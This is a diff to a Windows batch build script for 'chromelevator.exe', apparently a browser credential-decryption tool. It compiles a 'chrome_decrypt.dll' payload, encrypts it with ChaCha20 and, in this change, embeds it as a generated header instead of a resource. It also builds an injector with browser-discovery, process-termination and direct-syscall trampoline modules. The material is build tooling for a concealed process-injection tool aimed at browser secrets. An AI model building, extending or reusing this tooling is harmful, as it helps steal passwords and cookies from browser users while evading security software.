@@ -11,6 +11,7 @@ set "LIBS_DIR=libs"
 set "FINAL_EXE_NAME=chromelevator.exe"
 set "PAYLOAD_DLL_NAME=chrome_decrypt.dll"
 set "ENCRYPTOR_EXE_NAME=encryptor.exe"
+set "PAYLOAD_HEADER=payload_data.hpp"
 
 :: Compiler Flags
 set "CFLAGS_COMMON=/nologo /W3 /WX- /O1 /Os /MT /GS- /Gy /GL /GR- /Gw /Zc:threadSafeInit-"
@@ -35,7 +36,6 @@ call :compile_sqlite
 call :compile_payload
 call :compile_encryptor
 call :encrypt_payload
-call :compile_resource
 call :compile_injector
 goto :done
 
@@ -61,12 +61,11 @@ goto :eof
 call :compile_sqlite
 call :compile_payload
 call :encrypt_payload
-call :compile_resource
 call :compile_injector
 echo.
 echo =============================================================================
-echo [√] Build Complete: %FINAL_EXE_NAME%
-for %%A in (".\%FINAL_EXE_NAME%") do echo [√] Binary Size: %%~zA bytes
+echo [+] Build Complete: %FINAL_EXE_NAME%
+for %%A in (".\%FINAL_EXE_NAME%") do echo [+] Binary Size: %%~zA bytes
 echo =============================================================================
 goto :eof
 
@@ -75,13 +74,13 @@ goto :eof
 :: =============================================================================
 
 :compile_sqlite
-echo [1/6] Compiling SQLite3...
+echo [1/5] Compiling SQLite3...
 cl %CFLAGS_SQLITE% /c "%LIBS_DIR%\sqlite\sqlite3.c" /Fo"%BUILD_DIR%\sqlite3.obj" 2>nul
 lib /NOLOGO /LTCG /OUT:"%BUILD_DIR%\sqlite3.lib" "%BUILD_DIR%\sqlite3.obj" >nul
 goto :eof
 
 :compile_payload
-echo [2/6] Compiling Payload...
+echo [2/5] Compiling Payload...
 cl %CFLAGS_COMMON% /std:c++17 /EHs-c- /c "%SRC_DIR%\sys\bootstrap.cpp" /Fo"%BUILD_DIR%\bootstrap.obj"
 cl %CFLAGS_COMMON% %CFLAGS_CPP% /I"%LIBS_DIR%\sqlite" /c "%SRC_DIR%\payload\payload_main.cpp" /Fo"%BUILD_DIR%\payload_main.obj"
 cl %CFLAGS_COMMON% %CFLAGS_CPP% /c "%SRC_DIR%\com\elevator.cpp" /Fo"%BUILD_DIR%\elevator.obj"
@@ -109,52 +108,47 @@ link %LFLAGS_COMMON% %LFLAGS_MERGE% /DLL /OUT:"%BUILD_DIR%\%PAYLOAD_DLL_NAME%" ^
 goto :eof
 
 :compile_encryptor
-echo [3/6] Compiling Encryptor...
+echo [3/5] Compiling Encryptor...
 cl %CFLAGS_COMMON% %CFLAGS_CPP% /Fe"%BUILD_DIR%\%ENCRYPTOR_EXE_NAME%" ^
     "%SRC_DIR%\tools\encryptor.cpp" "%BUILD_DIR%\chacha20.obj" ^
     /link %LFLAGS_COMMON% bcrypt.lib
 goto :eof
 
 :encrypt_payload
-echo [4/6] Encrypting Payload...
-"%BUILD_DIR%\%ENCRYPTOR_EXE_NAME%" "%BUILD_DIR%\%PAYLOAD_DLL_NAME%" "%BUILD_DIR%\chrome_decrypt.enc"
-goto :eof
-
-:compile_resource
-echo [5/6] Compiling Resource...
-rc.exe /nologo /i "%BUILD_DIR%" /fo "%BUILD_DIR%\resource.res" "%SRC_DIR%\resource.rc"
+echo [4/5] Encrypting Payload + Generating Embedded Header...
+"%BUILD_DIR%\%ENCRYPTOR_EXE_NAME%" "%BUILD_DIR%\%PAYLOAD_DLL_NAME%" "%BUILD_DIR%\chrome_decrypt.enc" "%BUILD_DIR%\%PAYLOAD_HEADER%"
 goto :eof
 
 :compile_injector
-echo [6/6] Compiling Injector...
+echo [5/5] Compiling Injector...
 if "%VSCMD_ARG_TGT_ARCH%"=="arm64" (
     armasm64.exe -nologo "%SRC_DIR%\sys\syscall_trampoline_arm64.asm" -o "%BUILD_DIR%\syscall_trampoline.obj"
 ) else (
     ml64.exe /nologo /c /Fo"%BUILD_DIR%\syscall_trampoline.obj" "%SRC_DIR%\sys\syscall_trampoline_x64.asm"
 )
 
-cl %CFLAGS_COMMON% %CFLAGS_CPP% /c "%SRC_DIR%\injector\injector_main.cpp" /Fo"%BUILD_DIR%\injector_main.obj"
-cl %CFLAGS_COMMON% %CFLAGS_CPP% /c "%SRC_DIR%\injector\browser_discovery.cpp" /Fo"%BUILD_DIR%\browser_discovery.obj"
-cl %CFLAGS_COMMON% %CFLAGS_CPP% /c "%SRC_DIR%\injector\browser_terminator.cpp" /Fo"%BUILD_DIR%\browser_terminator.obj"
-cl %CFLAGS_COMMON% %CFLAGS_CPP% /c "%SRC_DIR%\injector\process_manager.cpp" /Fo"%BUILD_DIR%\process_manager.obj"
-cl %CFLAGS_COMMON% %CFLAGS_CPP% /c "%SRC_DIR%\injector\pipe_server.cpp" /Fo"%BUILD_DIR%\pipe_server.obj"
-cl %CFLAGS_COMMON% %CFLAGS_CPP% /c "%SRC_DIR%\injector\injector.cpp" /Fo"%BUILD_DIR%\injector.obj"
-cl %CFLAGS_COMMON% %CFLAGS_CPP% /c "%SRC_DIR%\sys\internal_api.cpp" /Fo"%BUILD_DIR%\internal_api.obj"
+cl %CFLAGS_COMMON% %CFLAGS_CPP% /I"%BUILD_DIR%" /c "%SRC_DIR%\injector\injector_main.cpp" /Fo"%BUILD_DIR%\injector_main.obj"
+cl %CFLAGS_COMMON% %CFLAGS_CPP% /I"%BUILD_DIR%" /c "%SRC_DIR%\injector\browser_discovery.cpp" /Fo"%BUILD_DIR%\browser_discovery.obj"
+cl %CFLAGS_COMMON% %CFLAGS_CPP% /I"%BUILD_DIR%" /c "%SRC_DIR%\injector\browser_terminator.cpp" /Fo"%BUILD_DIR%\browser_terminator.obj"
+cl %CFLAGS_COMMON% %CFLAGS_CPP% /I"%BUILD_DIR%" /c "%SRC_DIR%\injector\process_manager.cpp" /Fo"%BUILD_DIR%\process_manager.obj"
+cl %CFLAGS_COMMON% %CFLAGS_CPP% /I"%BUILD_DIR%" /c "%SRC_DIR%\injector\pipe_server.cpp" /Fo"%BUILD_DIR%\pipe_server.obj"
+cl %CFLAGS_COMMON% %CFLAGS_CPP% /I"%BUILD_DIR%" /c "%SRC_DIR%\injector\injector.cpp" /Fo"%BUILD_DIR%\injector.obj"
+cl %CFLAGS_COMMON% %CFLAGS_CPP% /I"%BUILD_DIR%" /c "%SRC_DIR%\sys\internal_api.cpp" /Fo"%BUILD_DIR%\internal_api.obj"
 
 link %LFLAGS_COMMON% %LFLAGS_MERGE% /OUT:".\%FINAL_EXE_NAME%" ^
     "%BUILD_DIR%\injector_main.obj" "%BUILD_DIR%\browser_discovery.obj" ^
     "%BUILD_DIR%\browser_terminator.obj" "%BUILD_DIR%\process_manager.obj" ^
     "%BUILD_DIR%\pipe_server.obj" "%BUILD_DIR%\injector.obj" ^
     "%BUILD_DIR%\internal_api.obj" "%BUILD_DIR%\chacha20.obj" ^
-    "%BUILD_DIR%\syscall_trampoline.obj" "%BUILD_DIR%\resource.res" ^
+    "%BUILD_DIR%\syscall_trampoline.obj" ^
     version.lib shell32.lib advapi32.lib user32.lib bcrypt.lib
 goto :eof
 
 :done
 echo.
 echo =============================================================================
-echo [√] Build Complete: %FINAL_EXE_NAME%
-for %%A in (".\%FINAL_EXE_NAME%") do echo [√] Binary Size: %%~zA bytes
+echo [+] Build Complete: %FINAL_EXE_NAME%
+for %%A in (".\%FINAL_EXE_NAME%") do echo [+] Binary Size: %%~zA bytes
 echo =============================================================================
 echo.
 echo Cleaning up build artifacts...
@@ -163,8 +157,8 @@ echo Cleaning up build artifacts...
 del /q "%BUILD_DIR%\*.obj" 2>nul
 del /q "%BUILD_DIR%\*.lib" 2>nul
 del /q "%BUILD_DIR%\*.exp" 2>nul
-del /q "%BUILD_DIR%\*.res" 2>nul
 del /q "%BUILD_DIR%\%ENCRYPTOR_EXE_NAME%" 2>nul
+del /q "%BUILD_DIR%\%PAYLOAD_HEADER%" 2>nul
 
 :: Clean up root directory artifacts (only in full build, not CI)
 del /q "*.obj" 2>nul
